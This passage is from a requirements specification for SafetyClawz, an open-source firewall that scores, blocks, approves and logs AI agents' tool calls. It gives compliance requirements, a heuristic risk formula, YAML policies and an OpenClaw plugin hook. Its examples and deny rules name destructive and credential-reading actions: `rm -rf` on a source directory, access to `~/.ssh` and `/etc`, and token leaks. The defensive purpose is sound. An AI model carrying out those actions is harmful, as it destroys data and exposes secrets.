- Alert triggers: BLOCK decisions, REQUIRE_APPROVAL decisions, risk score >0.8
- Alert channels: Webhook, Email, Slack, PagerDuty
- Alert includes: `agent_id`, `tool_name`, `risk_score`, `decision`, `reason`, `timestamp`
- Rate limiting to prevent alert storms (max 10/minute per agent)
- Alert configuration via YAML

**Example Alert**:
```
🚨 SafetyClawz Alert
Agent: healthbot-01
Action: BLOCKED - External PHI transfer attempt
Tool: api.post
Risk Score: 0.92 (CRITICAL)
Time: 2026-02-16 10:23:45 UTC
```

---

## 6.7 Developer Experience

### FR-DX-001: CLI Installation & Init
**Priority**: Must Have (MVP)  
**Source**: UJ-003

**Description**: System must provide one-command installation and project initialization.

**Acceptance Criteria**:
- Install via package manager: `pip install safetyclawz` (Python) or `npm install safetyclawz` (JS/TS)
- Init command: `safetyclawz init` generates default policy file and configuration
- Init command interactive (asks for agent runtime, risk tolerance, compliance framework)
- Generated files include inline comments explaining each setting

---

### FR-DX-002: Policy Validation Tool
**Priority**: Must Have (MVP)  
**Source**: Product Scope 5.1

**Description**: System must provide tool to validate policy syntax before deployment.

**Acceptance Criteria**:
- CLI command: `safetyclawz validate-policy policy.yaml`
- Checks: YAML syntax, rule schema compliance, condition expression validity
- Returns: line numbers for errors, warnings for best practices
- Exit code 0 for valid, non-zero for invalid

---

## Functional Requirements Summary

**MVP Strategy**: Start simple (allowlist wrapper + audit logging), add sophistication in Growth phase.

| Category | Must Have (MVP) | Should Have (Growth) | Nice to Have (Vision) |
|----------|-----------------|----------------------|-----------------------|
| Policy Management | FR-POL-001 (simple allowlists), FR-POL-002 | FR-POL-001 (complex conditionals), FR-POL-003 | |
| Risk Evaluation | *(deferred to Growth)* | FR-RISK-001, FR-RISK-002, FR-RISK-003 | ML-based scoring |
| Decision Execution | FR-DECISION-001 (ALLOW/BLOCK only) | FR-DECISION-001 (full 4-state), FR-DECISION-002, FR-DECISION-003 | |
| Integration | FR-INT-001, FR-INT-003 | FR-INT-002 | Multi-language SDKs |
| Audit & Logging | FR-AUDIT-001, FR-AUDIT-002 | FR-AUDIT-003, FR-AUDIT-004 | |
| Alerting | *(deferred to Growth)* | FR-ALERT-001 | Anomaly detection |
| Developer Experience | FR-DX-001, FR-DX-002 | | IDE extensions |

**Key MVP Simplifications**:
- **No risk scoring in V1** → Growth phase adds heuristic risk engine
- **No approval prompts in V1** → Growth phase adds REQUIRE_APPROVAL + human-in-loop
- **Simple allowlist policies in V1** → Growth phase adds complex conditional logic

---

# 7. Non-Functional Requirements

Non-functional requirements define quality attributes and constraints.

## 7.1 Performance

### NFR-PERF-001: Evaluation Latency
**Priority**: Must Have (MVP)  
**Source**: Product Scope 5.1, Architecture Principle

**Description**: Action evaluation must complete with minimal latency to avoid disrupting agent workflows.

**Acceptance Criteria**:
- P95 latency: <200ms (from ActionRequest submission to Decision return)
- P99 latency: <500ms
- Measured under load: 100 concurrent evaluations
- Excludes human approval wait time (REQUIRE_APPROVAL decisions)

**Measurement Method**: Performance test suite running 1000 evaluations with varied complexity.

---

### NFR-PERF-002: Audit Query Performance
**Priority**: Must Have (MVP)  
**Source**: UJ-002 (FR-AUDIT-002)

**Description**: Audit log queries must return results quickly for responsive compliance workflows.

**Acceptance Criteria**:
- Query response time: <200ms for 10K log entries
- Query response time: <2s for 1M log entries
- Filtering performance: No degradation with 5+ filter conditions
- Index support for: `timestamp`, `session_id`, `agent_id`, `decision`

---

### NFR-PERF-003: Memory Footprint
**Priority**: Should Have (MVP)  
**Source**: Integration with resource-constrained environments

**Description**: Library must operate efficiently in memory-constrained environments.

**Acceptance Criteria**:
- Base memory usage: <50MB (without loaded policies)
- Memory usage with 100-rule policy: <100MB
- No memory leaks during 10,000 consecutive evaluations

---

## 7.2 Usability

### NFR-UX-001: Approval Request Clarity
**Priority**: Must Have (MVP)  
**Source**: UJ-003

**Description**: When approval required, user must clearly understand what they're approving and why.

**Acceptance Criteria**:
- Approval prompt shows: tool name, arguments (truncated if long), risk score, risk factors, decision reason
- Estimated impact displayed (e.g., "Will delete 47 files recursively")
- Clear APPROVE / DENY options
- No security jargon (e.g., "PHI" expanded to "Protected Health Information")

**Example Prompt**:
```
⚠️  High-Risk Action Requires Approval

Tool: exec
Command: rm -rf src/tests/
Risk: 0.85 (HIGH)
Impact: Will delete 47 files recursively in src/tests/

Factors:
  • Recursive file deletion (+0.35)
  • Source code directory (+0.20)
  • Irreversible operation (+0.30)

[A]pprove  [D]eny  [S]imulate
```

---

### NFR-UX-002: Policy Error Messages
**Priority**: Must Have (MVP)  
**Source**: FR-POL-001

**Description**: Policy validation errors must guide users toward resolution.

**Acceptance Criteria**:
- Error messages include: file name, line number, column number (if applicable)
- Error message explains what's wrong and suggests fix
- No raw stack traces shown to end users

**Example Error**:
```
❌ Policy Validation Error

File: safety-policy.yaml
Line: 12
Problem: Unknown variable 'riskscore' in condition
         condition: riskscore > 0.7 AND external == true
                    ^^^^^^^^^
Did you mean: risk_score

Valid variables: risk_score, external_communication, tool, 
                 data_classification, confidence, chain_depth
```

---

## 7.3 Reliability

### NFR-REL-001: Fault Tolerance
**Priority**: Must Have (MVP)  
**Source**: Core Principle (fail-safe design)

**Description**: System failures must default to safe state (block execution) rather than fail-open.

**Acceptance Criteria**:
- Policy load failure → default to BLOCK or REQUIRE_APPROVAL (configurable, never APPROVE)
- Risk scorer crash → default to risk_score=1.0 (maximum risk)
- Audit log write failure → block execution (do not proceed without logging)
- Network timeout (middleware mode) → BLOCK decision after 5s timeout

---

### NFR-REL-002: Deterministic Evaluation
**Priority**: Must Have (MVP)  
**Source**: Product Definition (deterministic principle)

**Description**: Same ActionRequest and policy must always produce same Decision (no randomness).

**Acceptance Criteria**:
- Decision reproducible across runs given identical inputs
- No dependency on external services for core evaluation (V1)
- Timestamp differences do not affect decision (only audit metadata)

---

### NFR-REL-003: Audit Log Durability
**Priority**: Must Have (MVP)  
**Source**: FR-AUDIT-001

**Description**: Audit logs must not be lost due to system crashes or power failures.

**Acceptance Criteria**:
- Logs written with fsync (flush to disk before proceeding)
- Partial writes detectable and recoverable (JSONL format advantage)
- Log file rotation without data loss
- Corruption detection via hash-chaining (Growth phase)

---

## 7.4 Security

### NFR-SEC-001: Policy Tampering Protection
**Priority**: Should Have (Growth Phase)  
**Source**: UJ-002 (compliance requirement)

**Description**: Unauthorized policy modifications must be detectable.

**Acceptance Criteria**:
- Policy files include cryptographic signature (Growth phase)
- Unsigned policy changes trigger warning or rejection (configurable)
- Audit log records policy changes with timestamp and actor
- File permissions restrict write access to authorized users only

---

### NFR-SEC-002: Sensitive Data Handling
**Priority**: Must Have (MVP)  
**Source**: UJ-002 (HIPAA compliance)

**Description**: System must not leak sensitive data in logs, errors, or approval prompts.

**Acceptance Criteria**:
- Audit logs redact sensitive fields (configurable redaction rules)
- Error messages do not include full command arguments if sensitive
- Approval prompts truncate sensitive data (e.g., API keys shown as "sk-...xyz")
- Redaction documented in security guide

---

### NFR-SEC-003: Least Privilege Execution
**Priority**: Should Have (MVP)  
**Source**: Security best practices

**Description**: SafetyClawz process must run with minimal required permissions.

**Acceptance Criteria**:
- Does not require root/admin privileges for evaluation
- Audit log directory requires write permission only
- Policy files require read permission only
- Documented permission requirements in installation guide

---

## 7.5 Maintainability

### NFR-MAINT-001: Code Coverage
**Priority**: Should Have (MVP)  
**Source**: Open-source quality standards

**Description**: Codebase must maintain high test coverage for reliability.

**Acceptance Criteria**:
- Unit test coverage: >80% for core evaluation engine
- Integration test coverage: >60% for runtime adapters
- End-to-end tests for each user journey (3 minimum)
- CI/CD pipeline fails if coverage drops below thresholds

---

### NFR-MAINT-002: API Stability
**Priority**: Must Have (MVP)  
**Source**: Developer Trust (breaking changes harm adoption)

**Description**: Public API must follow semantic versioning with deprecation policy.

**Acceptance Criteria**:
- Breaking changes only in major versions (X.0.0)
- Deprecation warnings issued one minor version before removal
- Changelog documents all breaking changes
- Migration guides provided for major version upgrades

---

## 7.6 Observability

### NFR-OBS-001: Evaluation Metrics
**Priority**: Should Have (Growth Phase)  
**Source**: Success Criteria measurement

**Description**: System shall expose metrics for monitoring evaluation performance and decision distribution.

**Acceptance Criteria**:
- Metrics exposed via Prometheus-compatible endpoint
- Metrics include: evaluation latency (histogram), decision counts (counter), policy rule hit counts (counter), risk score distribution (histogram)
- Metrics tagged by: agent_id, tool_name, decision, risk_level

---

### NFR-OBS-002: Structured Logging
**Priority**: Should Have (MVP)  
**Source**: Debugging and troubleshooting

**Description**: System logs must be machine-parseable for log aggregation tools.

**Acceptance Criteria**:
- Logs output in JSON format (optional, configurable)
- Log levels: DEBUG, INFO, WARN, ERROR
- Structured fields: timestamp, level, message, context (session_id, agent_id, tool_name)

---

## Non-Functional Requirements Summary

| Category | Must Have (MVP) | Should Have (Growth) |
|----------|-----------------|----------------------|
| Performance | NFR-PERF-001, NFR-PERF-002 | NFR-PERF-003 |
| Usability | NFR-UX-001, NFR-UX-002 | |
| Reliability | NFR-REL-001, NFR-REL-002, NFR-REL-003 | |
| Security | NFR-SEC-002, NFR-SEC-003 | NFR-SEC-001 |
| Maintainability | NFR-MAINT-002 | NFR-MAINT-001 |
| Observability | NFR-OBS-002 | NFR-OBS-001 |

---

# 8. Domain Requirements

Domain requirements capture industry-specific, regulatory, and compliance constraints.

## 8.1 Healthcare (HIPAA Compliance)

### DOMAIN-HIPAA-001: PHI Protection
**Priority**: Must Have (Growth Phase)  
**Source**: UJ-002 (Enterprise Compliance Officer)

**Regulatory Context**: Health Insurance Portability and Accountability Act (HIPAA) requires strict controls on Protected Health Information (PHI) access and transmission.

**Requirements**:
- System must support PHI data classification tagging
- External transmission of PHI-tagged data must default to REQUIRE_APPROVAL or BLOCK
- Audit logs must retain PHI access records for minimum 6 years (configurable)
- Audit logs containing PHI must be encrypted at rest
- Policy templates must include HIPAA baseline controls

**Acceptance Criteria**:
- ActionRequest schema includes `data_classification` field supporting "PHI" value
- Pre-built HIPAA policy template blocks external PHI transfer
- Audit log retention configurable (default: 6 years)
- Audit log encryption via AES-256 or stronger

**Verification**: Compliance audit by qualified HIPAA assessor (Growth phase requirement).

---

### DOMAIN-HIPAA-002: Audit Trail Requirements
**Priority**: Must Have (Growth Phase)  
**Source**: UJ-002

**Regulatory Context**: HIPAA Security Rule § 164.312(b) requires audit controls to record and examine activity in systems containing ePHI.

**Requirements**:
- Audit logs must capture: who (agent_id), what (action), when (timestamp), outcome (decision)
- Logs must be tamper-evident (hash-chaining, signed receipts)
- Logs must be exportable for compliance review
- Access to audit logs must be restricted and logged (audit-the-auditor)

**Acceptance Criteria**:
- Audit log schema includes all required HIPAA fields
- Hash-chaining implemented (Growth phase: FR-AUDIT-004)
- Audit log access requires authentication and is itself logged
- Export format compatible with compliance reporting tools

---

## 8.2 Payment Card Industry (PCI-DSS Compliance)

### DOMAIN-PCI-001: Cardholder Data Protection
**Priority**: Should Have (Growth Phase)  
**Source**: Success Criteria (e-commerce agent use case)

**Regulatory Context**: PCI-DSS Requirement 10 mandates tracking and monitoring all access to network resources and cardholder data.

**Requirements**:
- System must support "PCI" data classification for cardholder data
- Actions involving PCI-classified data must be logged with enhanced detail
- External transmission of PCI data must default to BLOCK
- Failed authorization attempts must be logged and alerted

**Acceptance Criteria**:
- Data classification supports "PCI" value
- Pre-built PCI-DSS policy template provided
- Alert triggers on repeated BLOCK decisions for PCI data access
- Audit logs support 90-day retention minimum (configurable to 1 year per PCI requirement)

---

## 8.3 Enterprise Security (SOC 2 Compliance)

### DOMAIN-SOC2-001: Change Management Controls
**Priority**: Should Have (Growth Phase)  
**Source**: Success Criteria (enterprise adoption >30 companies)

**Regulatory Context**: SOC 2 Trust Services Criteria CC8.1 requires change management controls for system components.

**Requirements**:
- Policy changes must be versioned and tracked
- Policy change audit log must record: timestamp, author, diff, approval status
- Rollback capability for policy changes
- Separation of duties: policy author ≠ policy approver (configurable)

**Acceptance Criteria**:
- Policy file changes automatically logged to audit trail
- Policy versioning via Git integration or built-in versioning
- Rollback command: `safetyclawz policy rollback --version <hash>`
- Approval workflow configurable for enterprise environments

---

### DOMAIN-SOC2-002: Monitoring and Alerting
**Priority**: Should Have (Growth Phase)  
**Source**: Success Criteria (production deployments)

**Regulatory Context**: SOC 2 CC7.2 requires monitoring of system components and alerting on anomalies.

**Requirements**:
- Real-time alerting on high-risk BLOCK decisions
- Anomaly detection for unusual agent behavior patterns (Vision phase)
- Integration with SIEM tools (Splunk, ELK, Datadog)
- Alert fatigue mitigation (rate limiting, alert grouping)

**Acceptance Criteria**:
- Webhook alerts configurable (FR-ALERT-001)
- SIEM-compatible log format (JSONL)
- Alert rate limiting: max 10/min per agent (configurable)

---

## 8.4 Open Source Compliance

### DOMAIN-OSS-001: License Compliance
**Priority**: Must Have (MVP)  
**Source**: Project Definition (fully open source)

**Requirements**:
- All code released under permissive open-source license (MIT or Apache 2.0)
- Dependencies must use compatible licenses (no GPL in core library)
- License headers in all source files
- NOTICE file crediting third-party dependencies

**Acceptance Criteria**:
- License file present in repository root
- Automated license scanning in CI/CD (e.g., FOSSA, license-checker)
- Dependency license audit passes before release
- NOTICE file automatically generated from dependency metadata

---

### DOMAIN-OSS-002: Community Contribution Standards
**Priority**: Should Have (MVP)  
**Source**: Success Criteria (>50 GitHub stars)

**Requirements**:
- CONTRIBUTING.md with clear contribution guidelines
- Code of Conduct (Contributor Covenant)
- Pull request template with checklist (tests, docs, changelog)
- Issue templates for bug reports and feature requests

**Acceptance Criteria**:
- CONTRIBUTING.md covers: setup, testing, PR process, code style
- Code of Conduct enforced by maintainers
- PR template auto-populated on new pull requests
- Issue templates available in GitHub repository

---

## 8.5 Emerging Domains (Vision Phase)

### DOMAIN-ROBOTICS-001: Physical Safety Constraints
**Priority**: Nice to Have (Vision Phase)  
**Source**: Product Scope 5.3 (robotics safety - deferred from UJ-003)

**Domain Context**: When agents control physical systems (robots, industrial equipment), failures can cause injury or property damage.

**Requirements** (Aspirational):
- Safety interlocks for physical actuation (movement, gripping, cutting)
- Emergency stop integration (independent of SafetyClawz reasoning)
- Force/torque limits enforced in policy
- Compliance with ISO 10218 (industrial robotics safety)

**Acceptance Criteria** (To be defined in Vision phase):
- Integration with ROS (Robot Operating System)
- Real-time evaluation latency <10ms for physical safety
- Hardware e-stop circuit bypasses software firewall

**Note**: This domain deferred to Vision phase pending market validation.

---

## Domain Requirements Summary

| Domain | Growth Phase | Vision Phase |
|--------|--------------|--------------|
| Healthcare (HIPAA) | DOMAIN-HIPAA-001, DOMAIN-HIPAA-002 | |
| Payment (PCI-DSS) | DOMAIN-PCI-001 | |
| Enterprise (SOC 2) | DOMAIN-SOC2-001, DOMAIN-SOC2-002 | |
| Open Source | DOMAIN-OSS-001, DOMAIN-OSS-002 | |
| Robotics | | DOMAIN-ROBOTICS-001 |

---

# 9. Product Definition

SafetyClawz is:

* Runtime-agnostic
* Model-agnostic
* Lightweight
* Deterministic
* Explainable
* Fully open source

It defines and enforces an execution boundary.

---

# 10. Core Principle

No autonomous action executes without an interlock decision.

All external tool calls must be evaluated.

---

# 11. System Role

SafetyClawz does not:

* Generate content
* Replace LLMs
* Replace agent runtimes
* Evaluate prompts

It only governs execution.

That narrow scope is its strength.

---

# 12. Architecture

```
Agent
  ↓
SafetyClawz Firewall
  ↓
Risk Engine
  ↓
Policy Engine
  ↓
Decision Engine
  ↓
Execution Adapter
  ↓
External System
```

---

# 13. Core Components

## 13.1 Action Interceptor

Captures:

* Tool name
* Arguments
* Session metadata
* Confidence score
* Chain depth
* External communication flag
* Data classification
* Timestamp

All in a standardized ActionRequest object.

---

## 13.2 Risk Engine (V1 Heuristic Model)

Weighted scoring model:

```
risk_score =
  0.30 * external_comm +
  0.20 * sensitive_tool +
  0.20 * (1 - confidence) +
  0.15 * chain_depth_factor +
  0.15 * data_classification_weight
```

Outputs:

* risk_score (0–1)
* risk_level
* risk_factors
* explanation

Must be explainable.

No black-box scoring in V1.

---

## 13.3 Policy Engine

YAML-based, human-readable rules:

```yaml
rules:
  - name: block_high_risk_external
    condition: risk_score > 0.7 AND external_communication == true
    action: REQUIRE_APPROVAL

  - name: forbid_delete
    condition: tool == "db.delete"
    action: BLOCK
```

Policy evaluation must be deterministic.

---

## 13.4 Decision Engine

Returns:

* APPROVE
* REQUIRE_APPROVAL
* SIMULATE
* BLOCK

Includes policy rule triggered and reason.

---

## 13.5 Execution Adapter

Executes action only if decision allows.

Must be pluggable.

---

## 13.6 Audit Logging

Append-only JSONL logs:

* ActionRequest
* RiskAssessment
* Decision
* ActionReceipt

Future:

* Hash-chained logs
* Signed receipts
* Compliance exports

---

# 14. Integration Modes

## 14.1 Embedded Library (Primary)

Python-first implementation.

Optimized for:

* Local systems
* Developer workstations
* Raspberry Pi / edge devices
* Embedded AI systems

---

## 14.2 Middleware Adapter

Adapters for:

* OpenAI Agents
* LangGraph
* OpenClaw-style runtimes
* Custom agent frameworks

---

## 14.3 CLI Firewall Mode

```
safetyclawz evaluate action.json
```

Returns structured decision.

---

# 15. OpenClaw Use Case

**Context**: OpenClaw is a massively popular open-source personal AI assistant (202k+ GitHub stars) with powerful tool access (exec, messaging, file operations, 49+ skills). It has manual approval prompts but lacks automated enforcement of rate limits, contact allowlists, and secret redaction.

**OpenClaw Security Infrastructure**: OpenClaw provides comprehensive security **knowledge** (MITRE ATLAS threat model, dangerous tools list, malicious code scanner, prompt injection detection) but lacks runtime **enforcement** (audit is informational, not preventative). SafetyClawz bridges this gap by adding fail-closed policy enforcement to Trust Boundary 3 (Tool Execution).

**Reference**: See [OpenClaw-Security-Analysis.md](./OpenClaw-Security-Analysis.md) and [Architecture-V1.md](./Architecture-V1.md) for detailed MITRE ATLAS threat model alignment.

**SafetyClawz as OpenClaw Plugin**:

```bash
# Installation
npm install -g safetyclawz

# Configure OpenClaw (~/.openclaw/config.json)
{
  "plugins": {
    "allow": ["safetyclawz"],
    "load": {
      "paths": ["~/.npm-global/lib/node_modules/safetyclawz"]
    }
  }
}

# Create policy (~/.safetyclawz/policy.yaml)
safeguards:
  messaging:
    rate_limit: 10/hour
    allowed_contacts: ["+14155551212"]
  exec:
    allowed_commands: ["git", "npm"]
    blocked_paths: ["~/.ssh", "/etc"]
```

**Plugin Implementation** (TypeScript):

```typescript
export default function (api) {
  const policy = loadPolicy('~/.safetyclawz/policy.yaml');
  
  api.registerHook('before_tool_call', async (event, ctx) => {
    const { toolName, params } = event;
    const decision = await evaluatePolicy({ toolName, params, policy });
    
    if (decision.action === 'BLOCK') {
      return { block: true, blockReason: decision.reason };
    }
  });
  
  api.registerHook('after_tool_call', async (event, ctx) => {
    auditLog.write({ ...event, timestamp: Date.now() });
  });
}
```

**Example Protections**:

* Prevent unsafe shell execution (e.g., `find ~` dumping sensitive paths)
* Prevent spam to entire contact list via `imsg` tool (rate limit: 10/hour)
* Prevent destructive file operations (`rm -rf` on wrong directories)
* Prevent secret leaks (redact GitHub tokens from `1password` output)
* Block unauthorized messaging channels (only allow approved Discord servers)

**Benefits**:
- ✅ Zero OpenClaw code changes
- ✅ Works with any OpenClaw version
- ✅ Easy disable (remove from config.json)
- ✅ Aligns with MITRE ATLAS threat model (industry-standard AI security framework)
- ✅ Uses OpenClaw's production-validated dangerous tools list as baseline
- ✅ Adds runtime enforcement to OpenClaw's detection-only security audit
- ✅ Unified YAML policy across all 49+ skills

This demonstrates how AI agents with broad tool access require execution firewalls.

---

# 16. Competitive Positioning

SafetyClawz differs from:

Guardrails libraries:

* Focus on outputs and prompts
* Not execution enforcement

Prompt injection detectors:

* Focus on model inputs
* Not tool invocation governance

Agent frameworks:

* Focus on orchestration
* Not policy-bound execution

SafetyClawz is a narrow execution firewall.

---

# 17. Brand Positioning

SafetyClawz = Execution Firewall
Interlock Protocol (ILP) = Open Standard

Mascot makes it memorable.
Firewall makes it serious.

---